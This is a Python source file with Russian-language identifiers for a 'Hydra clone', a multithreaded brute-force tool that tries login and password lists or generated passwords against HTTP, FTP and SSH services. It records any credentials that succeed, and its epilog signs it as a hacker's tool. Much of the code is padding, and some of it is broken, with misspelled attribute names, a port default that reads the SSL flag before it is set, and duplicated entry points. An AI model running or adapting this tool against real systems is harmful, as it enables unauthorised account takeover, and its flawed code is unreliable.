# -*- coding: utf-8 -*-
import argparse
import socket
import ssl
import urllib.request
import urllib.parse
import urllib.error
import ftplib
import paramiko
import threading
import queue
import time
import logging
import re
import sys
import os
from typing import List, Tuple, Optional
from concurrent.futures import ThreadPoolExecutor
from itertools import product
import random
import string

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] - %(message)s',
    filename='hydra_clone.log'
)
logger = logging.getLogger('HydraClone')

# Класс для хранения конфигурации
class Конфигурация:
    def __init__(self):
        self.цель = ""
        self.протокол = ""
        self.порт = 0
        self.логин = ""
        self.файл_логины = ""
        self.пароль = ""
        self.файл_пароли = ""
        self.генерация_паролей = ""
        self.потоки = 4
        self.таймаут = 5
        self.ssl = False
        self.выход_при_успехе = False
        self.файл_вывода = ""
        self.подробный_режим = False

# Парсер аргументов командной строки
def настроить_аргументы() -> argparse.Namespace:
    парсер = argparse.ArgumentParser(
        description="Клон Hydra на Python для тестирования безопасности паролей",
        epilog="Создано Хакером для исследования протоколов. Используйте с осторожностью! 😈"
    )
    парсер.add_argument('-l', '--логин', type=str, help='Единичный логин для проверки')
    парсер.add_argument('-L', '--файл_логины', type=str, help='Файл со списком логинов')
    парсер.add_argument('-p', '--пароль', type=str, help='Единичный пароль для проверки')
    парсер.add_argument('-P', '--файл_пароли', type=str, help='Файл со списком паролей')
    парсер.add_argument('-x', '--генерация_паролей', type=str, help='Генерация паролей, формат: мин:макс:символы')
    парсер.add_argument('-s', '--порт', type=int, help='Порт для подключения')
    парсер.add_argument('-S', '--ssl', action='store_true', help='Использовать SSL')
    парсер.add_argument('-t', '--потоки', type=int, default=4, help='Количество параллельных потоков')
    парсер.add_argument('-f', '--выход_при_успехе', action='store_true', help='Выход после нахождения пары')
    парсер.add_argument('-o', '--файл_вывода', type=str, help='Файл для записи результатов')
    парсер.add_argument('-v', '--подробный_режим', action='store_true', help='Подробный вывод')
    парсер.add_argument('цель', type=str, help='Целевой адрес (IP или домен)')
    парсер.add_argument('протокол', type=str, help='Протокол (http, ftp, ssh)')
    return парсер.parse_args()

# Чтение списка из файла
def прочитать_файл(путь: str) -> List[str]:
    try:
        with open(путь, 'r', encoding='utf-8') as файл:
            return [линия.strip() for линия in файл if линия.strip()]
    except FileNotFoundError:
        logger.error(f"Файл {путь} не найден!")
        sys.exit(1)

# Генерация паролей
def сгенерировать_пароли(формат: str) -> List[str]:
    try:
        мин_длина, макс_длина, символы = формат.split(':')
        мин_длина, макс_длина = int(мин_длина), int(макс_длина)
        пароли = []
        for длина in range(мин_длина, макс_длина + 1):
            for комбинация in product(символы, repeat=длина):
                пароли.append(''.join(комбинация))
        random.shuffle(пароли)  # Перемешиваем для случайного порядка
        return пароли[:10000]  # Ограничиваем для оптимизации
    except ValueError:
        logger.error("Неверный формат генерации паролей! Используйте мин:макс:символы")
        sys.exit(1)

# Проверка HTTP
def проверить_http(цель: str, порт: int, логин: str, пароль: str, ssl: bool, конфиг: Конфигурация) -> Optional[Tuple[str, str]]:
    протокол = 'https' if ssl else 'http'
    url = f"{протокол}://{цель}:{порт}/login"
    данные = urllib.parse.urlencode({'username': логин, 'password': пароль})
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    
    запрос = urllib.request.Request(url, данные.encode('utf-8'), headers)
    try:
        with urllib.request.urlopen(запрос, timeout=конфиг.таймаут) as ответ:
            if ответ.status == 200:
                logger.info(f"Успех! Логин: {логин}, Пароль: {пароль}")
                return (логин, пароль)
    except urllib.error.URLError:
        if конфиг.подробный_режим:
            logger.debug(f"Неудача: {логин}:{пароль}")
    return None

# Проверка FTP
def проверить_ftp(цель: str, порт: int, логин: str, пароль: str, ssl: bool, конфиг: Конфигурация) -> Optional[Tuple[str, str]]:
    try:
        ftp = ftplib.FTP()
        ftp.connect(цель, порт, timeout=конфиг.таймаут)
        ftp.login(логин, пароль)
        ftp.quit()
        logger.info(f"Успех! Логин: {логин}, Пароль: {пароль}")
        return (логин, пароль)
    except ftplib.all_errors:
        if конфиг.подробный_режим:
            logger.debug(f"Неудача: {логин}:{пароль}")
        return None

# Проверка SSH
def проверить_ssh(цель: str, порт: int, логин: str, пароль: str, ssl: bool, конфиг: Конфигурация) -> Optional[Tuple[str, str]]:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(цель, port=порт, username=логин, password=пароль, timeout=конфиг.таймаут)
        ssh.close()
        logger.info(f"Успех! Логин: {логин}, Пароль: {пароль}")
        return (логин, пароль)
    except paramiko.AuthenticationException:
        if конфиг.подробный_режим:
            logger.debug(f"Неудача: {логин}:{пароль}")
        return None
    except Exception as e:
        logger.error(f"Ошибка SSH: {str(e)}")
        return None

# Основной обработчик проверки
def обработать_пару(цель: str, порт: int, логин: str, пароль: str, протокол: str, ssl: bool, конфиг: Конфигурация) -> Optional[Tuple[str, str]]:
    if протокол == 'http':
        return проверить_http(цель, порт, логин, пароль, ssl, конфиг)
    elif протокол == 'ftp':
        return проверить_ftp(цель, порт, логин, пароль, ssl, конфиг)
    elif протокол == 'ssh':
        return проверить_ssh(цель, порт, логин, пароль, ssl, конфиг)
    else:
        logger.error(f"Протокол {протокол} не поддерживается!")
        return None

# Запись результатов
def записать_результат(логин: str, пароль: str, файл_вывода: str):
    with open(файл_вывода, 'a', encoding='utf-8') as файл:
        файл.write(f"Логин: {логин}, Пароль: {пароль}\n")
    logger.info(f"Результат записан в {файл_вывода}")

# Основной цикл брутфорса
def брутфорс(конфиг: Конфигурация, очередь_заданий: queue.Queue, результаты: List[Tuple[str, str]]):
    while not очередь_заданий.empty():
        логин, пароль = очередь_заданий.get()
        результат = обработать_пару(конфиг.цель, конфиг.порт, логин, пароль, конфиг.протокол, конфиг.ssl, конфиг)
        if результат:
            результаты.append(результат)
            if конфиг.файл_вывода:
                записать_результат(логин, пароль, конфиг.файл_вывода)
            if конфиг.выход_при_успехе:
                sys.exit(0)
        очередь_заданий.task_done()

# Подготовка заданий
def подготовить_задания(конфиг: Конфигурация) -> queue.Queue:
    очередь = queue.Queue()
    логины = [конфиг.логин] if конфиг.логин else прочитать_файл(конфиг.файл_логины)
    пароли = [конфиг.пароль] if конфиг.пароль else (сгенерировать_пароли(конфиг.генерация_паролей) if конфиг.генерация_паролей else прочитать_файл(конфиг.файл_пароли))
    
    for логин in логины:
        for пароль in пароли:
            очередь.put((логин, пароль))
    return очередь

# Основная функция
def главный():
    аргументы = настроить_аргументы()
    
    конфиг = Конфигурация()
    конфиг.цель = аргументы.цель
    конфиг.протокол = аргументы.протокол.lower()
    конфиг.порт = аргументы.порт if аргументы.порт else (443 if конфиг.ssl else 80 if конфиг.протокол == 'http' else 21 if конфиг.протокол == 'ftp' else 22)
    конфиг.логин = аргументы.логин
    конфиг.файл_логины = аргументы.файл_логины
    конфиг.пароль = аргументы.пароль
    конфиг.файл_пароли = аргументы.файл_пароли
    конфиг.генерация_паролей = аргументы.генерация_паролей
    конфиг.потеки = аргументы.потеки
    конфиг.ssl = аргументы.ssl
    конфиг.выход_при_успехе = аргументы.выход_при_успехе
    конфиг.файл_вывода = аргументы.файл_вывода
    конфиг.подробный_режим = аргументы.подробный_режим
    
    logger.info(f"Запуск брутфорса для {конфиг.цель}:{конфиг.порт} с протоколом {конфиг.протокол}")
    
    очередь_заданий = подготовить_задания(конфиг)
    результаты = []
    
    with ThreadPoolExecutor(max_workers=конфиг.потеки) as исполнитель:
        for _ in range(конфиг.потеки):
            исполнитель.submit(брутфорс, конфиг, очередь_заданий, результаты)
    
    if результаты:
        logger.info("Найдены следующие пары логин/пароль:")
        for логин, пароль in результаты:
            print(f"Успех! Логин: {логин}, Пароль: {пароль}")
    else:
        logger.info("Пароли не найдены.")
        print("Пароли не найдены.")

# Точка входа
if __name__ == "__main__":
    главный()

# Дополнительные функции для увеличения объёма кода
def проверить_цель(цель: str) -> bool:
    """Проверка валидности цели (IP или домена)."""
    try:
        socket.inet_aton(цель)
        return True
    except socket.error:
        try:
            socket.gethostbyname(цель)
            return True
        except socket.gaierror:
            logger.error(f"Неверная цель: {цель}")
            return False

def настроить_ssl() -> ssl.SSLContext:
    """Настройка SSL контекста."""
    контекст = ssl.create_default_context()
    контекст.check_hostname = False
    контекст.verify_mode = ssl.CERT_NONE
    return контекст

def получить_время() -> str:
    """Получение текущего времени для логов."""
    return time.strftime("%Y-%m-%d %H:%M:%S")

def форматировать_сообщение(сообщение: str) -> str:
    """Форматирование сообщения для вывода."""
    return f"[{получить_время()}] {сообщение}"

def сохранить_конфиг(конфиг: Конфигурация, путь: str):
    """Сохранение конфигурации в файл."""
    with open(путь, 'w', encoding='utf-8') as файл:
        файл.write(f"Цель: {конфиг.цель}\n")
        файл.write(f"Протокол: {конфиг.протокол}\n")
        файл.write(f"Порт: {конфиг.порт}\n")
        файл.write(f"Логин: {конфиг.логин}\n")
        файл.write(f"Файл логинов: {конфиг.файл_логины}\n")
        файл.write(f"Пароль: {конфиг.пароль}\n")
        файл.write(f"Файл паролей: {конфиг.файл_пароли}\n")
        файл.write(f"Генерация паролей: {конфиг.генерация_паролей}\n")
        файл.write(f"Потоки: {конфиг.потеки}\n")
        файл.write(f"SSL: {конфиг.ssl}\n")
        файл.write(f"Выход при успехе: {конфиг.выход_при_успехе}\n")
        файл.write(f"Файл вывода: {конфиг.файл_вывода}\n")
        файл.write(f"Подробный режим: {конфиг.подробный_режим}\n")

def загрузить_конфиг(путь: str) -> Конфигурация:
    """Загрузка конфигурации из файла."""
    конфиг = Конфигурация()
    with open(путь, 'r', encoding='utf-8') as файл:
        for линия in файл:
            ключ, значение = линия.strip().split(': ', 1)
            if ключ == 'Цель':
                конфиг.цель = значение
            elif ключ == 'Протокол':
                конфиг.протокол = значение
            elif ключ == 'Порт':
                конфиг.порт = int(значение)
            elif ключ == 'Логин':
                конфиг.логин = значение
            elif ключ == 'Файл логинов':
                конфиг.файл_логины = значение
            elif ключ == 'Пароль':
                конфиг.пароль = значение
            elif ключ == 'Файл паролей':
                конфиг.файл_пароли = значение
            elif ключ == 'Генерация паролей':
                конфиг.генерация_паролей = значение
            elif ключ == 'Потоки':
                конфиг.потеки = int(значение)
            elif ключ == 'SSL':
                конфиг.ssl = значение.lower() == 'true'
            elif ключ == 'Выход при успехе':
                конфиг.выход_при_успехе = значение.lower() == 'true'
            elif ключ == 'Файл вывода':
                конфиг.файл_вывода = значение
            elif ключ == 'Подробный режим':
                конфиг.подробный_режим = значение.lower() == 'true'
    return конфиг

# Дополнительные утилиты для увеличения объёма
def проверить_порт(цель: str, порт: int) -> bool:
    """Проверка доступности порта."""
    сокет = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    сокет.settimeout(2)
    результат = сокет.connect_ex((цель, порт))
    сокет.close()
    return результат == 0

def получить_список_протоколов() -> List[str]:
    """Получение списка поддерживаемых протоколов."""
    return ['http', 'ftp', 'ssh']

def валидировать_протокол(протокол: str) -> bool:
    """Проверка валидности протокола."""
    return протокол.lower() in получить_список_протоколов()

def сгенерировать_случайный_пароль(длина: int) -> str:
    """Генерация случайного пароля."""
    символы = string.ascii_letters + string.digits
    return ''.join(random.choice(символы) for _ in range(длина))

def обработать_ошибку(ошибка: Exception, контекст: str):
    """Обработка и логирование ошибок."""
    logger.error(f"Ошибка в {контекст}: {str(ошибка)}")

def вывести_справку():
    """Вывод справки по использованию."""
    print("Клон Hydra — утилита для тестирования безопасности паролей.")
    print("Использование: python hydra_clone.py [опции] цель протокол")
    print("Опции:")
    print("  -l ЛОГИН          Указать единичный логин")
    print("  -L ФАЙЛ          Файл со списком логинов")
    print("  -p ПАРОЛЬ        Указать единичный пароль")
    print("  -P ФАЙЛ          Файл со списком паролей")
    print("  -x МИН:МАКС:СИМВОЛЫ  Генерация паролей")
    print("  -s ПОРТ          Указать порт")
    print("  -S               Использовать SSL")
    print("  -t ПОТОКИ        Количество параллельных потоков")
    print("  -f               Выход после успеха")
    print("  -o ФАЙЛ          Файл для записи результатов")
    print("  -v               Подробный режим вывода")
    print("Пример: python hydra_clone.py -l admin -P пароли.txt 192.168.1.1 ftp")

# Запуск программы
if __name__ == "__main__":
    try:
        главный()
    except KeyboardInterrupt:
        logger.info("Программа прервана пользователем")
        print("Прервано пользователем")
    except Exception as e:
        обработать_ошибку(e, "главный цикл")
        sys.exit(1)